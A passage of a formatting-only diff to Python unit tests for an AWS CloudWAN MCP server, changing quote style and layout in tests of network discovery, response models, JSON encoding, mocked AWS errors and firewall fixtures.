+    @patch("awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client")
     async def test_aws_service_error_handling(self, mock_get_client):
         """Test AWS error handling patterns."""
         from awslabs.cloudwan_mcp_server.tools.core import list_core_networks
@@ -118,16 +119,15 @@
         # Mock AWS client that raises service error
         mock_client = Mock()
         mock_client.list_core_networks.side_effect = ClientError(
-            {"Error": {"Code": "AccessDenied"}},
-            "ListCoreNetworks"
+            {"Error": {"Code": "AccessDenied"}}, "ListCoreNetworks"
         )
         mock_get_client.return_value = mock_client
 
         # Test error handling - should return error response, not raise
         result = await list_core_networks()
-        assert result['success'] is False
-        assert 'error' in result
-        assert 'AccessDenied' in result['error'] or 'Access denied' in result['error']
+        assert result["success"] is False
+        assert "error" in result
+        assert "AccessDenied" in result["error"] or "Access denied" in result["error"]
 
     @pytest.mark.unit
     def test_logging_patterns(self):
@@ -137,18 +137,21 @@
         logger = get_logger(__name__)
 
         # AWS Labs standard: loguru-based logging
-        assert hasattr(logger, 'info')
-        assert hasattr(logger, 'error')
-        assert hasattr(logger, 'warning')
-        assert hasattr(logger, 'debug')
+        assert hasattr(logger, "info")
+        assert hasattr(logger, "error")
+        assert hasattr(logger, "warning")
+        assert hasattr(logger, "debug")
 
     @pytest.mark.unit
-    @pytest.mark.parametrize("tool_name,expected_result", [
-        ("list_core_networks", True),
-        ("get_global_networks", True),
-        ("trace_network_path", True),
-        ("nonexistent_tool", False)
-    ])
+    @pytest.mark.parametrize(
+        "tool_name,expected_result",
+        [
+            ("list_core_networks", True),
+            ("get_global_networks", True),
+            ("trace_network_path", True),
+            ("nonexistent_tool", False),
+        ],
+    )
     def test_tool_availability_parametrized(self, tool_name, expected_result):
         """Test tool availability using parametrized testing (AWS Labs pattern)."""
         from awslabs.cloudwan_mcp_server import server
@@ -161,26 +164,23 @@
         """Test configuration validation follows AWS Labs patterns."""
         from awslabs.cloudwan_mcp_server.utils.config import validate_configuration
 
-        valid_config = {
-            'aws_region': 'us-east-1',
-            'log_level': 'INFO'
-        }
+        valid_config = {"aws_region": "us-east-1", "log_level": "INFO"}
 
         invalid_config = {
-            'log_level': 'INVALID'  # Missing required aws_region
+            "log_level": "INVALID"  # Missing required aws_region
         }
 
         assert validate_configuration(valid_config) is True
         assert validate_configuration(invalid_config) is False
 
     @pytest.mark.unit
-    @patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'})
+    @patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"})
     def test_environment_variable_handling(self):
         """Test environment variable handling follows AWS Labs patterns."""
         from awslabs.cloudwan_mcp_server.utils.config import get_aws_region
 
         region = get_aws_region()
-        assert region == 'us-east-1'
+        assert region == "us-east-1"
 
     @pytest.mark.unit
     def test_resource_cleanup_patterns(self):
@@ -190,4 +190,4 @@
         config_manager = AWSConfigManager()
 
         # Test that cleanup method exists (AWS Labs pattern for resource management)
-        assert hasattr(config_manager, 'cleanup') or hasattr(config_manager, '__del__')
+        assert hasattr(config_manager, "cleanup") or hasattr(config_manager, "__del__")

--- cloudwan-mcp-server/tests/unit/test_comprehensive_models.py
+++ cloudwan-mcp-server/tests/unit/test_comprehensive_models.py
@@ -33,8 +33,8 @@
         """Test valid ContentItem creation with required fields."""
         content_item = ContentItem(type="text", text="Test content")
 
-        assert content_item['type'] == "text"
-        assert content_item['text'] == "Test content"
+        assert content_item["type"] == "text"
+        assert content_item["text"] == "Test content"
         assert len(content_item) == 2
 
     @pytest.mark.unit
@@ -44,15 +44,15 @@
 
         for content_type in valid_types:
             content_item = ContentItem(type=content_type, text=f"Content for {content_type}")
-            assert content_item['type'] == content_type
-            assert isinstance(content_item['text'], str)
+            assert content_item["type"] == content_type
+            assert isinstance(content_item["text"], str)
 
     @pytest.mark.unit
     def test_content_item_empty_text(self):
         """Test ContentItem with empty text (should be valid)."""
         content_item = ContentItem(type="text", text="")
-        assert content_item['type'] == "text"
-        assert content_item['text'] == ""
+        assert content_item["type"] == "text"
+        assert content_item["text"] == ""
 
     @pytest.mark.unit
     def test_content_item_with_json_text(self):
@@ -60,12 +60,12 @@
         json_text = json.dumps({"key": "value", "number": 42})
         content_item = ContentItem(type="json", text=json_text)
 
-        assert content_item['type'] == "json"
-        assert content_item['text'] == json_text
+        assert content_item["type"] == "json"
+        assert content_item["text"] == json_text
         # Verify text is valid JSON
-        parsed = json.loads(content_item['text'])
-        assert parsed['key'] == "value"
-        assert parsed['number'] == 42
+        parsed = json.loads(content_item["text"])
+        assert parsed["key"] == "value"
+        assert parsed["number"] == 42
 
     @pytest.mark.unit
     def test_content_item_with_multiline_text(self):
@@ -75,9 +75,9 @@
 This is line 3 with special chars: !@#$%^&*()"""
 
         content_item = ContentItem(type="text", text=multiline_text)
-        assert content_item['type'] == "text"
-        assert content_item['text'] == multiline_text
-        assert '\n' in content_item['text']
+        assert content_item["type"] == "text"
+        assert content_item["text"] == multiline_text
+        assert "\n" in content_item["text"]
 
 
 class TestMcpResponseModel:
@@ -89,10 +89,10 @@
         content = [ContentItem(type="text", text="Response content")]
         response = McpResponse(content=content)
 
-        assert 'content' in response
-        assert len(response['content']) == 1
-        assert response['content'][0]['type'] == "text"
-        assert response['content'][0]['text'] == "Response content"
+        assert "content" in response
+        assert len(response["content"]) == 1
+        assert response["content"][0]["type"] == "text"
+        assert response["content"][0]["text"] == "Response content"
 
     @pytest.mark.unit
     def test_mcp_response_with_error_flag(self):
@@ -100,8 +100,8 @@
         content = [ContentItem(type="error", text="Error occurred")]
         response = McpResponse(content=content, isError=True)
 
-        assert response['content'][0]['type'] == "error"
-        assert response['isError'] is True
+        assert response["content"][0]["type"] == "error"
+        assert response["isError"] is True
 
     @pytest.mark.unit
     def test_mcp_response_without_error_flag(self):
@@ -110,8 +110,8 @@
         response = McpResponse(content=content)
 
         # isError should not be present when not specified
-        assert 'content' in response
-        assert 'isError' not in response or response.get('isError') is False
+        assert "content" in response
+        assert "isError" not in response or response.get("isError") is False
 
     @pytest.mark.unit
     def test_mcp_response_multiple_content_items(self):
@@ -119,34 +119,34 @@
         content = [
             ContentItem(type="text", text="First item"),
             ContentItem(type="json", text='{"key": "value"}'),
-            ContentItem(type="warning", text="Warning message")
+            ContentItem(type="warning", text="Warning message"),
         ]
         response = McpResponse(content=content)
 
-        assert len(response['content']) == 3
-        assert response['content'][0]['type'] == "text"
-        assert response['content'][1]['type'] == "json"
-        assert response['content'][2]['type'] == "warning"
+        assert len(response["content"]) == 3
+        assert response["content"][0]["type"] == "text"
+        assert response["content"][1]["type"] == "json"
+        assert response["content"][2]["type"] == "warning"
 
     @pytest.mark.unit
     def test_mcp_response_empty_content_list(self):
         """Test McpResponse with empty content list."""
         response = McpResponse(content=[])
-        assert 'content' in response
-        assert len(response['content']) == 0
+        assert "content" in response
+        assert len(response["content"]) == 0
 
     @pytest.mark.unit
     def test_mcp_response_error_scenario(self):
         """Test McpResponse for error scenarios following AWS Labs patterns."""
         error_content = [
             ContentItem(type="error", text="AWS API call failed"),
-            ContentItem(type="text", text="Additional error details")
+            ContentItem(type="text", text="Additional error details"),
         ]
         response = McpResponse(content=error_content, isError=True)
 
-        assert response['isError'] is True
-        assert len(response['content']) == 2
-        assert response['content'][0]['type'] == "error"
+        assert response["isError"] is True
+        assert len(response["content"]) == 2
+        assert response["content"][0]["type"] == "error"
 
 
 class TestDateTimeEncoder:
@@ -184,18 +184,14 @@
     @pytest.mark.unit
     def test_datetime_encoder_in_json_dumps(self):
         """Test DateTimeEncoder integration with json.dumps."""
-        test_data = {
-            "timestamp": datetime(2024, 1, 15, 10, 30, 45),
-            "message": "Test message",
-            "count": 42
-        }
+        test_data = {"timestamp": datetime(2024, 1, 15, 10, 30, 45), "message": "Test message", "count": 42}
 
         result = json.dumps(test_data, cls=DateTimeEncoder)
         parsed = json.loads(result)
 
-        assert parsed['timestamp'] == "2024-01-15T10:30:45"
-        assert parsed['message'] == "Test message"
-        assert parsed['count'] == 42
+        assert parsed["timestamp"] == "2024-01-15T10:30:45"
+        assert parsed["message"] == "Test message"
+        assert parsed["count"] == 42
 
 
 class TestSafeJsonDumps:
@@ -204,18 +200,14 @@
     @pytest.mark.unit
     def test_safe_json_dumps_with_datetime(self):
         """Test safe_json_dumps handles datetime objects correctly."""
-        test_data = {
-            "created_at": datetime(2024, 1, 15, 10, 30, 45),
-            "name": "Test Resource",
-            "active": True
-        }
+        test_data = {"created_at": datetime(2024, 1, 15, 10, 30, 45), "name": "Test Resource", "active": True}
 
         result = safe_json_dumps(test_data)
         parsed = json.loads(result)
 
-        assert parsed['created_at'] == "2024-01-15T10:30:45"
-        assert parsed['name'] == "Test Resource"
-        assert parsed['active'] is True
+        assert parsed["created_at"] == "2024-01-15T10:30:45"
+        assert parsed["name"] == "Test Resource"
+        assert parsed["active"] is True
 
     @pytest.mark.unit
     def test_safe_json_dumps_with_indent(self):
@@ -225,7 +217,7 @@
         result = safe_json_dumps(test_data, indent=2)
 
         # Verify formatting
-        assert '\n' in result
+        assert "\n" in result
         assert '  "key": "value"' in result
         assert '  "timestamp": "2024-01-15T10:30:45"' in result
 
@@ -237,24 +229,20 @@
                 {
                     "id": "core-network-123",
                     "created_at": datetime(2024, 1, 15, 10, 30, 45),
-                    "segments": ["prod", "dev"]
+                    "segments": ["prod", "dev"],
                 },
-                {
-                    "id": "core-network-456",
-                    "created_at": datetime(2024, 1, 16, 11, 45, 30),
-                    "segments": ["staging"]
-                }
+                {"id": "core-network-456", "created_at": datetime(2024, 1, 16, 11, 45, 30), "segments": ["staging"]},
             ],
-            "total_count": 2
+            "total_count": 2,
         }
 
         result = safe_json_dumps(test_data)
         parsed = json.loads(result)
 
-        assert len(parsed['core_networks']) == 2
-        assert parsed['core_networks'][0]['created_at'] == "2024-01-15T10:30:45"
-        assert parsed['core_networks'][1]['created_at'] == "2024-01-16T11:45:30"
-        assert parsed['total_count'] == 2
+        assert len(parsed["core_networks"]) == 2
+        assert parsed["core_networks"][0]["created_at"] == "2024-01-15T10:30:45"
+        assert parsed["core_networks"][1]["created_at"] == "2024-01-16T11:45:30"
+        assert parsed["total_count"] == 2
 
     @pytest.mark.unit
     def test_safe_json_dumps_empty_objects(self):
@@ -263,16 +251,16 @@
             "empty_dict": {},
             "empty_list": [],
             "null_value": None,
-            "timestamp": datetime(2024, 1, 15, 10, 30, 45)
+            "timestamp": datetime(2024, 1, 15, 10, 30, 45),
         }
 
         result = safe_json_dumps(test_data)
         parsed = json.loads(result)
 
-        assert parsed['empty_dict'] == {}
-        assert parsed['empty_list'] == []
-        assert parsed['null_value'] is None
-        assert parsed['timestamp'] == "2024-01-15T10:30:45"
+        assert parsed["empty_dict"] == {}
+        assert parsed["empty_list"] == []
+        assert parsed["null_value"] is None
+        assert parsed["timestamp"] == "2024-01-15T10:30:45"
 
 
 class TestAWSLabsResponseFormats:
@@ -284,16 +272,16 @@
         success_data = {
             "success": True,
             "data": {"resource_id": "test-123", "status": "active"},
-            "timestamp": datetime(2024, 1, 15, 10, 30, 45)
+            "timestamp": datetime(2024, 1, 15, 10, 30, 45),
         }
 
         json_result = safe_json_dumps(success_data, indent=2)
         parsed = json.loads(json_result)
 
-        assert parsed['success'] is True
-        assert 'data' in parsed
-        assert parsed['data']['resource_id'] == "test-123"
-        assert parsed['timestamp'] == "2024-01-15T10:30:45"
+        assert parsed["success"] is True
+        assert "data" in parsed
+        assert parsed["data"]["resource_id"] == "test-123"
+        assert parsed["timestamp"] == "2024-01-15T10:30:45"
 
     @pytest.mark.unit
     def test_error_response_format(self):
@@ -302,16 +290,16 @@
             "success": False,
             "error": "Resource not found",
             "error_code": "ResourceNotFound",
-            "timestamp": datetime(2024, 1, 15, 10, 30, 45)
+            "timestamp": datetime(2024, 1, 15, 10, 30, 45),
         }
 
         json_result = safe_json_dumps(error_data, indent=2)
         parsed = json.loads(json_result)
 
-        assert parsed['success'] is False
-        assert parsed['error'] == "Resource not found"
-        assert parsed['error_code'] == "ResourceNotFound"
-        assert parsed['timestamp'] == "2024-01-15T10:30:45"
+        assert parsed["success"] is False
+        assert parsed["error"] == "Resource not found"
+        assert parsed["error_code"] == "ResourceNotFound"
+        assert parsed["timestamp"] == "2024-01-15T10:30:45"
 
     @pytest.mark.unit
     def test_mcp_content_response_integration(self):
@@ -322,7 +310,7 @@
                 {
                     "CoreNetworkId": "core-network-123",
                     "CreatedAt": datetime(2024, 1, 15, 10, 30, 45),
-                    "State": "AVAILABLE"
+                    "State": "AVAILABLE",
                 }
             ]
         }
@@ -335,14 +323,14 @@
         mcp_response = McpResponse(content=[content_item])
 
         # Verify structure
-        assert len(mcp_response['content']) == 1
-        assert mcp_response['content'][0]['type'] == "json"
+        assert len(mcp_response["content"]) == 1
+        assert mcp_response["content"][0]["type"] == "json"
 
         # Verify JSON content can be parsed
-        parsed_content = json.loads(mcp_response['content'][0]['text'])
-        assert len(parsed_content['CoreNetworks']) == 1
-        assert parsed_content['CoreNetworks'][0]['CoreNetworkId'] == "core-network-123"
-        assert parsed_content['CoreNetworks'][0]['CreatedAt'] == "2024-01-15T10:30:45"
+        parsed_content = json.loads(mcp_response["content"][0]["text"])
+        assert len(parsed_content["CoreNetworks"]) == 1
+        assert parsed_content["CoreNetworks"][0]["CoreNetworkId"] == "core-network-123"
+        assert parsed_content["CoreNetworks"][0]["CreatedAt"] == "2024-01-15T10:30:45"
 
     @pytest.mark.unit
     def test_validation_error_patterns(self):
@@ -350,7 +338,7 @@
         validation_errors = [
             "CoreNetworkId is required",
             "PolicyDocument format is invalid",
-            "Invalid CIDR block format"
+            "Invalid CIDR block format",
         ]
 
         error_response = {
@@ -358,13 +346,13 @@
             "error": "Validation failed",
             "error_code": "ValidationError",
             "validation_errors": validation_errors,
-            "timestamp": datetime(2024, 1, 15, 10, 30, 45)
+            "timestamp": datetime(2024, 1, 15, 10, 30, 45),
         }
 
         json_result = safe_json_dumps(error_response, indent=2)
         parsed = json.loads(json_result)
 
-        assert parsed['success'] is False
-        assert parsed['error_code'] == "ValidationError"
-        assert len(parsed['validation_errors']) == 3
-        assert "CoreNetworkId is required" in parsed['validation_errors']
+        assert parsed["success"] is False
+        assert parsed["error_code"] == "ValidationError"
+        assert len(parsed["validation_errors"]) == 3
+        assert "CoreNetworkId is required" in parsed["validation_errors"]

--- cloudwan-mcp-server/tests/unit/test_core_tools.py
+++ cloudwan-mcp-server/tests/unit/test_core_tools.py
@@ -39,11 +39,12 @@
 @pytest.fixture(scope="function")
 def mock_get_aws_client():
     """Enhanced AWS client mock using hierarchical service mocking.
-    
+
     Provides realistic AWS service responses with proper error handling,
     regional behavior, and comprehensive API coverage for all NetworkManager
     operations including core networks, policies, change sets, and events.
     """
+
     def _mock_client(service: str, region: str = None) -> Mock:
         """Create enhanced service client mock with realistic behaviors."""
         region = region or "us-east-1"
@@ -52,45 +53,45 @@
         service_mocker = AWSServiceMocker(service, region)
         return service_mocker.client
 
-    with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=_mock_client) as mock:
+    with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=_mock_client) as mock:
         yield mock
 
 
 @pytest.fixture(scope="function")
 def enhanced_error_scenarios() -> Dict[str, Dict[str, Any]]:
     """Comprehensive error scenario configurations for testing.
-    
+
     Provides structured error scenarios covering all AWS error types
     with proper HTTP status codes, request IDs, and operation contexts.
     """
     return {
         "access_denied_core_networks": {
-            "error": AWSErrorCatalog.get_error('access_denied', 'ListCoreNetworks'),
+            "error": AWSErrorCatalog.get_error("access_denied", "ListCoreNetworks"),
             "operation": "list_core_networks",
-            "expected_code": "AccessDenied"
+            "expected_code": "AccessDenied",
         },
         "throttling_global_networks": {
-            "error": AWSErrorCatalog.get_error('throttling', 'DescribeGlobalNetworks'),
+            "error": AWSErrorCatalog.get_error("throttling", "DescribeGlobalNetworks"),
             "operation": "describe_global_networks",
-            "expected_code": "ThrottlingException"
+            "expected_code": "ThrottlingException",
         },
         "resource_not_found_policy": {
-            "error": AWSErrorCatalog.get_error('resource_not_found', 'GetCoreNetworkPolicy'),
+            "error": AWSErrorCatalog.get_error("resource_not_found", "GetCoreNetworkPolicy"),
             "operation": "get_core_network_policy",
-            "expected_code": "ResourceNotFoundException"
+            "expected_code": "ResourceNotFoundException",
         },
         "validation_error_change_set": {
-            "error": AWSErrorCatalog.get_error('validation_error', 'GetCoreNetworkChangeSet'),
+            "error": AWSErrorCatalog.get_error("validation_error", "GetCoreNetworkChangeSet"),
             "operation": "get_core_network_change_set",
-            "expected_code": "ValidationException"
-        }
+            "expected_code": "ValidationException",
+        },
     }
 
 
 @pytest.fixture(scope="function")
 def multi_region_responses() -> Dict[str, Dict[str, Any]]:
     """Multi-region response configurations for regional testing.
-    
+
     Provides region-specific mock responses to test cross-region behavior,
     regional failover scenarios, and region-aware error handling.
     """
@@ -101,7 +102,7 @@
                     "CoreNetworkId": "core-network-use1-1234567890abcdef0",
                     "GlobalNetworkId": "global-network-1234567890abcdef0",
                     "State": "AVAILABLE",
-                    "Description": "US East 1 core network"
+                    "Description": "US East 1 core network",
                 }
             ]
         },
@@ -111,13 +112,13 @@
                     "CoreNetworkId": "core-network-euw1-1234567890abcdef0",
                     "GlobalNetworkId": "global-network-1234567890abcdef0",
                     "State": "AVAILABLE",
-                    "Description": "EU West 1 core network"
+                    "Description": "EU West 1 core network",
                 }
             ]
         },
         "ap-southeast-2": {
             "core_networks": []  # Empty region for testing edge cases
-        }
+        },
     }
 
 
@@ -127,17 +128,11 @@
     from botocore.exceptions import ClientError
 
     error_response = {
-        'Error': {
-            'Code': 'ResourceNotFoundException',
-            'Message': 'Test error message for resource not found'
-        },
-        'ResponseMetadata': {
-            'RequestId': 'test-request-id-123',
-            'HTTPStatusCode': 404
-        }
+        "Error": {"Code": "ResourceNotFoundException", "Message": "Test error message for resource not found"},
+        "ResponseMetadata": {"RequestId": "test-request-id-123", "HTTPStatusCode": 404},
     }
 
-    return ClientError(error_response, 'TestOperation')
+    return ClientError(error_response, "TestOperation")
 
 
 class TestCoreNetworking:
@@ -185,13 +180,13 @@
         """Test core networks listing with AWS client error."""
         # Mock ClientError
         error_response = {
-            'Error': {
-                'Code': 'AccessDenied',
-                'Message': 'User is not authorized to perform networkmanager:ListCoreNetworks'
+            "Error": {
+                "Code": "AccessDenied",
+                "Message": "User is not authorized to perform networkmanager:ListCoreNetworks",
             }
         }
         mock_get_aws_client.return_value.list_core_networks.side_effect = ClientError(
-            error_response, 'ListCoreNetworks'
+            error_response, "ListCoreNetworks"
         )
 
         result = await list_core_networks("us-east-1")
@@ -217,7 +212,7 @@
     @pytest.mark.asyncio
     async def test_get_global_networks_default_region(self, mock_get_aws_client):
         """Test global networks with default region."""
-        with patch.dict(os.environ, {'AWS_DEFAULT_REGION': 'us-west-1'}):
+        with patch.dict(os.environ, {"AWS_DEFAULT_REGION": "us-west-1"}):
             result = await get_global_networks()
             response = json.loads(result)
 
@@ -311,15 +306,15 @@
 
     def test_standard_test_classes(self):
         """Verify presence of required test classes."""
-        assert hasattr(TestCoreNetworking, 'test_list_core_networks_success')
-        assert hasattr(TestAWSLabsStandards, 'test_standard_error_handling')
+        assert hasattr(TestCoreNetworking, "test_list_core_networks_success")
+        assert hasattr(TestAWSLabsStandards, "test_standard_error_handling")
 
 
 @pytest.mark.asyncio
 async def test_environment_variable_handling():
     """Test proper environment variable handling."""
-    with patch.dict(os.environ, {'AWS_DEFAULT_REGION': 'eu-central-1'}):
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+    with patch.dict(os.environ, {"AWS_DEFAULT_REGION": "eu-central-1"}):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             mock_client.return_value.list_core_networks.return_value = {"CoreNetworks": []}
 
             result = await list_core_networks()
@@ -330,12 +325,15 @@
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize("policy_alias,expected_alias", [
-    ("LIVE", "LIVE"),
-    ("LATEST", "LATEST"),
-    (None, "LIVE"),  # Test default
-    ("custom-alias", "custom-alias")
-])
+@pytest.mark.parametrize(
+    "policy_alias,expected_alias",
+    [
+        ("LIVE", "LIVE"),
+        ("LATEST", "LATEST"),
+        (None, "LIVE"),  # Test default
+        ("custom-alias", "custom-alias"),
+    ],
+)
 async def test_policy_alias_handling(mock_get_aws_client, policy_alias, expected_alias):
     """Test comprehensive policy alias handling across different scenarios."""
     core_network_id = "core-network-1234567890abcdef0"
@@ -352,12 +350,15 @@
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize("region,expected_call_count", [
-    ("us-east-1", 1),
-    ("eu-west-1", 1),
-    ("ap-southeast-2", 1),
-    ("invalid-region", 1)  # Should still make call, AWS will handle validation
-])
+@pytest.mark.parametrize(
+    "region,expected_call_count",
+    [
+        ("us-east-1", 1),
+        ("eu-west-1", 1),
+        ("ap-southeast-2", 1),
+        ("invalid-region", 1),  # Should still make call, AWS will handle validation
+    ],
+)
 async def test_regional_client_creation(mock_get_aws_client, region, expected_call_count):
     """Test client creation behavior across different AWS regions."""
     await list_core_networks(region)
@@ -367,12 +368,15 @@
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize("error_scenario", [
-    "access_denied_core_networks",
-    "throttling_global_networks",
-    "resource_not_found_policy",
-    "validation_error_change_set"
-])
+@pytest.mark.parametrize(
+    "error_scenario",
+    [
+        "access_denied_core_networks",
+        "throttling_global_networks",
+        "resource_not_found_policy",
+        "validation_error_change_set",
+    ],
+)
 async def test_comprehensive_error_scenarios(mock_get_aws_client, enhanced_error_scenarios, error_scenario):
     """Test comprehensive error handling across all operations and error types."""
     scenario = enhanced_error_scenarios[error_scenario]
@@ -478,11 +482,7 @@
         return await list_core_networks(region)
 
     # Execute multiple concurrent calls
-    tasks = [
-        concurrent_call("us-east-1"),
-        concurrent_call("us-west-2"),
-        concurrent_call("eu-west-1")
-    ]
+    tasks = [concurrent_call("us-east-1"), concurrent_call("us-west-2"), concurrent_call("eu-west-1")]
 
     results = await asyncio.gather(*tasks, return_exceptions=True)
 

--- cloudwan-mcp-server/tests/unit/test_discovery_tools.py
+++ cloudwan-mcp-server/tests/unit/test_discovery_tools.py
@@ -31,7 +31,7 @@
 @pytest.fixture(scope="function")
 def mock_networkmanager_client():
     """Mock NetworkManager client with realistic AWS CloudWAN responses.
-    
+
     Provides comprehensive mock responses for all NetworkManager operations
     including core networks, global networks, policies, and change management.
     """
@@ -42,7 +42,7 @@
 @pytest.fixture(scope="function")
 def mock_ec2_client():
     """Mock EC2 client with realistic VPC and networking responses.
-    
+
     Configured to provide standard VPC discovery responses with proper
     AWS resource formatting and metadata.
     """
@@ -72,7 +72,7 @@
 @pytest.fixture(scope="function")
 def enhanced_networkmanager_client():
     """Enhanced NetworkManager client with configurable responses.
-    
+
     Provides advanced mocking capabilities including:
     - Multi-region response simulation
     - Error scenario configuration
@@ -83,35 +83,23 @@
     # Add comprehensive NFG responses
     mocker.client.list_network_function_groups.return_value = {
         "NetworkFunctionGroups": [
-            {
-                "name": "production-nfg",
-                "status": "available",
-                "description": "Production network function group"
-            },
-            {
-                "name": "staging-nfg",
-                "status": "available",
-                "description": "Staging network function group"
-            }
+            {"name": "production-nfg", "status": "available", "description": "Production network function group"},
+            {"name": "staging-nfg", "status": "available", "description": "Staging network function group"},
         ]
     }
 
     return mocker
 
 
-@pytest.fixture(scope="function", params=[
-    "access_denied",
-    "resource_not_found",
-    "throttling",
-    "validation_error"
-])
+@pytest.fixture(scope="function", params=["access_denied", "resource_not_found", "throttling", "validation_error"])
 def parametrized_aws_errors(request, aws_error_catalog):
     """Parametrized fixture providing comprehensive AWS error scenarios.
-    
+
     Tests run against multiple error conditions to ensure robust
     error handling across all discovery operations.
     """
-    return aws_error_catalog.get_error(request.param, 'TestOperation')
+    return aws_error_catalog.get_error(request.param, "TestOperation")
+
 
 class TestDiscoveryTools:
     """Test network discovery tools."""
@@ -215,8 +203,7 @@
         # Mock client error
         mock_client = Mock()
         mock_client.describe_global_networks.side_effect = ClientError(
-            {"Error": {"Code": "AccessDenied", "Message": "Access denied"}},
-            "DescribeGlobalNetworks"
+            {"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, "DescribeGlobalNetworks"
         )
         mock_get_aws_client_fixture.return_value = mock_client
 
@@ -248,7 +235,7 @@
         """Test VPC discovery with default region from environment."""
         from awslabs.cloudwan_mcp_server.server import discover_vpcs
 
-        with patch.dict(os.environ, {'AWS_DEFAULT_REGION': 'eu-west-1'}):
+        with patch.dict(os.environ, {"AWS_DEFAULT_REGION": "eu-west-1"}):
             result = await discover_vpcs()
             response = json.loads(result)
 
@@ -274,7 +261,7 @@
         tools_and_args = [
             (list_core_networks, ["us-east-1"]),
             (discover_vpcs, ["us-east-1"]),
-            (get_global_networks, ["us-east-1"])
+            (get_global_networks, ["us-east-1"]),
         ]
 
         for tool_func, args in tools_and_args:
@@ -286,14 +273,17 @@
             assert "Generic error" in response["error"]
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("error_code,operation", [
-        ("AccessDenied", "ListCoreNetworks"),
-        ("ThrottlingException", "DescribeGlobalNetworks"),
-        ("ValidationException", "DescribeVpcs"),
-        ("ResourceNotFoundException", "ListCoreNetworks"),
-        ("InternalFailure", "DescribeGlobalNetworks"),
-        ("ServiceUnavailable", "DescribeVpcs")
-    ])
+    @pytest.mark.parametrize(
+        "error_code,operation",
+        [
+            ("AccessDenied", "ListCoreNetworks"),
+            ("ThrottlingException", "DescribeGlobalNetworks"),
+            ("ValidationException", "DescribeVpcs"),
+            ("ResourceNotFoundException", "ListCoreNetworks"),
+            ("InternalFailure", "DescribeGlobalNetworks"),
+            ("ServiceUnavailable", "DescribeVpcs"),
+        ],
+    )
     async def test_error_handling_matrix(self, mock_get_aws_client_fixture, aws_error_catalog, error_code, operation):
         """Test comprehensive error code/operation matrix for robust error handling."""
         from awslabs.cloudwan_mcp_server.server import (
@@ -306,18 +296,18 @@
         operation_map = {
             "ListCoreNetworks": list_core_networks,
             "DescribeGlobalNetworks": get_global_networks,
-            "DescribeVpcs": discover_vpcs
+            "DescribeVpcs": discover_vpcs,
         }
 
         # Configure error based on error code
         mock_client = Mock()
         error_mapping = {
-            'AccessDenied': 'access_denied',
-            'ThrottlingException': 'throttling',
-            'ValidationException': 'validation_error',
-            'ResourceNotFoundException': 'resource_not_found',
-            'InternalFailure': 'internal_failure',
-            'ServiceUnavailable': 'service_unavailable'
+            "AccessDenied": "access_denied",
+            "ThrottlingException": "throttling",
+            "ValidationException": "validation_error",
+            "ResourceNotFoundException": "resource_not_found",
+            "InternalFailure": "internal_failure",
+            "ServiceUnavailable": "service_unavailable",
         }
 
         error = aws_error_catalog.get_error(error_mapping[error_code], operation)
@@ -342,9 +332,7 @@
         assert "error" in response
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("region", [
-        "us-east-1", "us-west-2", "eu-west-1", "ap-southeast-2"
-    ])
+    @pytest.mark.parametrize("region", ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-2"])
     async def test_regional_behavior_validation(self, mock_get_aws_client_fixture, region):
         """Test regional behavior across different AWS regions."""
         from awslabs.cloudwan_mcp_server.server import list_core_networks
@@ -389,8 +377,8 @@
             "ResponseMetadata": {
                 "RequestId": "test-request-id",
                 "HTTPStatusCode": 200,
-                "HTTPHeaders": {"x-amzn-trace-id": "test-trace-id"}
-            }
+                "HTTPHeaders": {"x-amzn-trace-id": "test-trace-id"},
+            },
         }
         mock_get_aws_client_fixture.return_value = mock_client
 
@@ -415,7 +403,7 @@
             ("invalid", False, "Invalid format"),
             ("300.300.300.300", False, "Invalid IPv4 octets"),
             ("", False, "Empty string"),
-            ("192.168.1.1/24", False, "CIDR notation")
+            ("192.168.1.1/24", False, "CIDR notation"),
         ]
 
         for ip_input, should_succeed, description in edge_cases:

--- cloudwan-mcp-server/tests/unit/test_network_firewall_tools.py
+++ cloudwan-mcp-server/tests/unit/test_network_firewall_tools.py
@@ -26,18 +26,18 @@
     analyze_anfw_policy,
     analyze_five_tuple_flow,
     parse_suricata_rules,
-    simulate_policy_changes
+    simulate_policy_changes,
 )
 
 
 class TestNetworkFirewallTools:
     """Test suite for NetworkFirewallTools class."""
-    
+
     @pytest.fixture
     def firewall_tools(self):
         """Create NetworkFirewallTools instance for testing."""
         return NetworkFirewallTools()
-    
+
     @pytest.fixture
     def mock_firewall_response(self):
         """Mock firewall describe response."""
@@ -47,29 +47,29 @@
                 "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/test-firewall",
                 "VpcId": "vpc-12345",
                 "SubnetMappings": [{"SubnetId": "subnet-12345"}],
-                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy"
+                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy",
             },
-            "FirewallStatus": {
-                "Status": "READY"
-            }
+            "FirewallStatus": {"Status": "READY"},
         }
-    
+
     @pytest.fixture
     def mock_policy_response(self):
         """Mock firewall policy response."""
         return {
             "FirewallPolicy": {
                 "StatelessRuleGroups": [
-                    {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/test-stateless"}
+                    {
+                        "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/test-stateless"
+                    }
                 ],
                 "StatefulRuleGroups": [
                     {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/test-stateful"}
                 ],
                 "StatelessDefaultActions": ["aws:pass"],
-                "StatelessFragmentDefaultActions": ["aws:drop"]
+                "StatelessFragmentDefaultActions": ["aws:drop"],
             }
         }
-    
+
     @pytest.fixture
